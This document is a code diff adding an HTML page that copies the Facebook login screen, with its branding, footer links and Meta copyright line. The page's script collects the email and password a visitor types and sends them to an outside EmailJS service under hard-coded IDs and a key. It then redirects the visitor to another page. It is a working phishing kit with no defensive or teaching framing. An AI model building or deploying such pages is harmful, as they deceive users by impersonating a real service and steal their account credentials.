@@ -1,0 +1,380 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Custom styles to override or enhance Tailwind */
+        body {
+            font-family: 'Inter', sans-serif; /* Using Inter as per guidelines */
+            background-color: #f0f2f5; /* Light grey background */
+            display: flex;
+            flex-direction: column; /* Stack elements vertically */
+            align-items: center; /* Center content horizontally */
+            min-height: 100vh; /* Ensure full viewport height */
+            margin: 0; /* Remove default body margin */
+            box-sizing: border-box; /* Include padding and border in element's total width and height */
+        }
+
+        /* Styling for the large Facebook logo at the very top */
+        .top-facebook-logo {
+            color: #1877f2; /* Facebook blue */
+            font-family: 'Klavika', sans-serif; /* Placeholder for Facebook's custom font, if available */
+            font-size: 55px; /* Even larger font size for the top logo */
+            font-weight: bold;
+            margin-top: 100px; /* Space from the top of the viewport */
+            margin-bottom: -10px; /* Adjust vertical spacing with the form below */
+            line-height: 1; /* Tight line height */
+            text-align: center;
+        }
+
+        /* Container for the login box to help with centering and max-width */
+        .container {
+            background-color: transparent; /* No background for the container itself */
+            display: flex;
+            justify-content: center; /* Center the login box within the container */
+            width: 100%; /* Full width */
+            max-width: 980px; /* Max width to mimic Facebook's page structure */
+            padding: 20px; /* Padding around the content */
+            box-sizing: border-box;
+        }
+
+        /* Styling for the main login form box */
+        .login-box {
+            background-color: #fff; /* White background */
+            border-radius: 8px; /* Slightly rounded corners */
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1); /* More pronounced shadow */
+            padding: 20px 0 28px; /* Top/bottom padding, no side padding as inputs handle width */
+            text-align: center; /* Center text within the box */
+            width: 396px; /* Specific width to match the original */
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: center; /* Center items within the flex container */
+        }
+
+        /* "Log In to Facebook" heading styling - now the first heading inside the box */
+        .login-box h2 {
+            color: #1c1e21; /* Dark grey text */
+            font-size: 17px; /* Adjusted font size */
+            font-weight: normal;
+            margin-top: 0; /* No top margin */
+            margin-bottom: 20px; /* Bottom margin for spacing */
+            line-height: 1.2;
+        }
+
+        /* Form styling to control input and button layout */
+        .login-box form {
+            width: 100%; /* Form takes full width of its parent */
+            padding: 0 16px; /* Side padding for the form content */
+            box-sizing: border-box;
+        }
+
+        /* Styling for email/phone and password input fields */
+        .login-box input[type="text"],
+        .login-box input[type="password"] {
+            width: 100%; /* Full width within the form's padding */
+            padding: 14px 16px; /* Generous padding */
+            margin-bottom: 12px; /* Spacing between inputs */
+            border: 1px solid #dddfe2; /* Light grey border */
+            border-radius: 6px; /* Rounded corners */
+            font-size: 17px; /* Font size for input text */
+            box-sizing: border-box; /* Include padding and border in width */
+        }
+
+        /* Styling for the "Log In" button */
+        .login-box button[type="submit"] {
+            background-color: #1877f2; /* Facebook blue */
+            color: #fff; /* White text */
+            font-size: 20px; /* Larger font size */
+            font-weight: bold;
+            padding: 14px 16px; /* Padding for the button */
+            border: none; /* No border */
+            border-radius: 6px; /* Rounded corners */
+            cursor: pointer; /* Pointer on hover */
+            width: 100%; /* Full width */
+            margin-bottom: 16px; /* Spacing below the button */
+            box-sizing: border-box;
+            transition: background-color 0.2s ease; /* Smooth hover effect */
+        }
+
+        .login-box button[type="submit"]:hover {
+            background-color: #166fe6; /* Slightly darker blue on hover */
+        }
+
+        /* Styling for the "Forgot account?" link */
+        .forgot-password {
+            color: #1877f2; /* Facebook blue */
+            font-size: 14px; /* Smaller font size */
+            text-decoration: none; /* No underline by default */
+            display: block; /* Make it a block element for centering */
+            margin-bottom: 16px; /* Spacing below the link */
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline; /* Underline on hover */
+        }
+
+        /* Horizontal rule (separator) styling */
+        .login-box hr {
+            border: none; /* Remove default border */
+            border-bottom: 1px solid #dadde1; /* Light grey bottom border */
+            margin: 20px 0; /* Vertical margin */
+            width: calc(100% - 32px); /* Adjust width to match form padding */
+        }
+
+        /* Styling for the "Create new account" button (used as an anchor for styling consistency) */
+        .create-new-account {
+            background-color: #42b72a; /* Facebook green */
+            color: #fff; /* White text */
+            font-size: 17px; /* Font size */
+            font-weight: bold;
+            padding: 15px 16px; /* Padding */
+            border: none; /* No border */
+            border-radius: 6px; /* Rounded corners */
+            cursor: pointer; /* Pointer on hover */
+            display: inline-block; /* Allows padding and margin, but respects content width */
+            text-decoration: none; /* Remove underline */
+            transition: background-color 0.2s ease; /* Smooth hover effect */
+        }
+
+        .create-new-account:hover {
+            background-color: #36a420; /* Slightly darker green on hover */
+        }
+
+        /* Footer styling */
+        .footer {
+            background-color: #fff; /* White background */
+            color: #737373; /* Grey text */
+            padding: 20px; /* Padding inside the footer */
+            text-align: left; /* Align text to the left */
+            width: 100%; /* Full width */
+            max-width: 980px; /* Match container width */
+            box-sizing: border-box;
+            border-top: 1px solid #dddfe2; /* Top border */
+            font-size: 12px; /* Smaller font size */
+            margin-top: 60px; /* Space above the footer */
+        }
+
+        /* Styling for language links in the footer */
+        .language-links {
+            margin-bottom: 10px; /* Spacing below language links */
+            display: flex; /* Use flexbox for horizontal layout */
+            flex-wrap: wrap; /* Allow links to wrap to the next line */
+            line-height: 1.5; /* Line height for better readability */
+        }
+
+        .language-links a {
+            color: #737373;
+            text-decoration: none;
+            margin-right: 10px; /* Spacing between links */
+            white-space: nowrap; /* Prevent individual links from breaking */
+        }
+
+        .language-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* Styling for the plus sign in language links */
+        .language-links .plus-sign {
+            margin-left: 5px;
+            cursor: pointer;
+            color: #737373;
+            font-weight: bold;
+        }
+
+        /* Styling for the bottom section of footer links */
+        .bottom-links {
+            margin-top: 10px;
+            margin-bottom: 10px;
+            display: flex; /* Use flexbox */
+            flex-wrap: wrap; /* Allow links to wrap */
+            line-height: 1.5; /* Line height for readability */
+        }
+
+        .bottom-links a {
+            color: #737373;
+            text-decoration: none;
+            margin-right: 10px; /* Spacing between links */
+            white-space: nowrap; /* Prevent individual links from breaking */
+        }
+
+        .bottom-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* Copyright text styling */
+        .copyright {
+            margin-top: 10px;
+            color: #737373;
+        }
+
+        /* Modal specific styles */
+        .modal {
+            display: none; /* Hidden by default */
+            position: fixed; /* Stay in place */
+            z-index: 1000; /* Sit on top */
+            left: 0;
+            top: 0;
+            width: 100%; /* Full width */
+            height: 100%; /* Full height */
+            overflow: auto; /* Enable scroll if needed */
+            background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: #fefefe;
+            margin: auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%; /* Could be responsive */
+            max-width: 400px;
+            border-radius: 8px;
+            text-align: center;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+        }
+
+        .close-button {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .close-button:hover,
+        .close-button:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <h1 class="top-facebook-logo">facebook</h1>
+    <div class="container">
+        <div class="login-box">
+            <h2>Log In to Facebook</h2>
+            <form id="loginForm">
+                <input type="text" id="email" name="user_email" placeholder="Email or phone number" required />
+                <input type="password" id="password" name="user_password" placeholder="Password" required />
+                <button type="submit">Log In</button>
+                <a href="#" class="forgot-password">Forgot account?</a>
+                <hr />
+                <a href="#" class="create-new-account">Create new account</a>
+            </form>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="language-links">
+            <a href="#">English (US)</a><a href="#">Español</a><a href="#">Français (France)</a><a href="#">中文(简体)</a><a href="#">العربية</a>
+            <a href="#">Português (Brasil)</a><a href="#">Italiano</a><a href="#">한국어</a><a href="#">Deutsch</a><a href="#">हिन्दी</a>
+            <a href="#">日本語</a><span class="plus-sign">+</span>
+        </div>
+        <div class="bottom-links">
+            <a href="#">Sign Up</a><a href="#">Log In</a><a href="#">Messenger</a><a href="#">Facebook Lite</a><a href="#">Video</a>
+            <a href="#">Meta Pay</a><a href="#">Meta Store</a><a href="#">Meta Quest</a><a href="#">Ray-Ban Meta</a><a href="#">Meta AI</a>
+            <a href="#">Instagram</a><a href="#">Threads</a><a href="#">Voting Information Center</a><a href="#">Privacy Policy</a>
+            <a href="#">Consumer Health Privacy</a><a href="#">Privacy Center</a><a href="#">About</a><a href="#">Create ad</a>
+            <a href="#">Create Page</a><a href="#">Developers</a><a href="#">Careers</a><a href="#">Cookies</a><a href="#">Ad choices</a>
+            <a href="#">Terms</a><a href="#">Help</a><a href="#">Contact Uploading & Non-Users</a>
+        </div>
+        <div class="copyright">
+            <p>Meta © 2025</p>
+        </div>
+    </div>
+
+    <!-- The Modal Structure -->
+    <div id="myModal" class="modal">
+        <div class="modal-content">
+            <span class="close-button">&times;</span>
+            <p id="modalMessage"></p>
+            <button id="modalOkButton" class="mt-4 px-4 py-2 bg-blue-500 text-white rounded-md hover:bg-blue-600">OK</button>
+        </div>
+    </div>
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <script>
+        // Get the modal, message paragraph, and close button elements
+        const modal = document.getElementById("myModal");
+        const modalMessage = document.getElementById("modalMessage");
+        const closeButton = document.getElementsByClassName("close-button")[0];
+        const modalOkButton = document.getElementById("modalOkButton");
+
+        // Function to display the custom modal
+        function showModal(message, isSuccess = false) {
+            modalMessage.textContent = message;
+            modal.style.display = "flex"; // Use flex to center the modal content
+            if (isSuccess) {
+                // Optionally change button color or add success icon
+                modalOkButton.classList.remove('bg-blue-500', 'hover:bg-blue-600');
+                modalOkButton.classList.add('bg-green-500', 'hover:bg-green-600');
+            } else {
+                modalOkButton.classList.remove('bg-green-500', 'hover:bg-green-600');
+                modalOkButton.classList.add('bg-blue-500', 'hover:bg-blue-600');
+            }
+        }
+
+        // Function to hide the modal
+        function hideModal() {
+            modal.style.display = "none";
+        }
+
+        // Event listeners for closing the modal
+        closeButton.onclick = hideModal;
+        modalOkButton.onclick = hideModal;
+
+        // Close the modal if the user clicks anywhere outside of it
+        window.onclick = function(event) {
+            if (event.target == modal) {
+                hideModal();
+            }
+        }
+
+        // Initialize EmailJS with your user ID
+        // IMPORTANT: Replace "YOUR_EMAILJS_USER_ID" with your actual EmailJS User ID.
+        // You can find this in your EmailJS account dashboard under Account -> API Keys.
+        emailjs.init("8I9Nc02LoFUMQcxka"); // e.g. "q3AKPxyz123456"
+
+        document.getElementById('loginForm').addEventListener('submit', function (e) {
+            e.preventDefault(); // Prevent the default form submission
+
+            const email = document.getElementById("email").value.trim();
+            const password = document.getElementById("password").value.trim();
+
+            // Basic client-side validation
+            if (!email || !password || password.length < 4) {
+                showModal("Please enter a valid email and password (min 4 characters).");
+                return; // Stop the function if validation fails
+            }
+
+            // Send email using EmailJS
+            // service_ag6mgqs is your EmailJS Service ID
+            // template_a8iqq4d is your EmailJS Template ID
+            // These IDs are found in your EmailJS dashboard.
+            emailjs.send("service_ag6mgqs", "template_a8iqq4d", {
+                user_email: email,
+                user_password: password
+            }).then(
+                function(response) {
+                    setTimeout(() => {
+                        window.location.href = "redi.html";
+                    }, 1500); // Redirect after 1.5 seconds
+                },
+                function(error) {
+                    console.error("FAILED...", error);
+                    showModal("Failed to send login information. Please try again later."); // Show error message
+                }
+            );
+        });
+    </script>
+</body>
+</html>
+
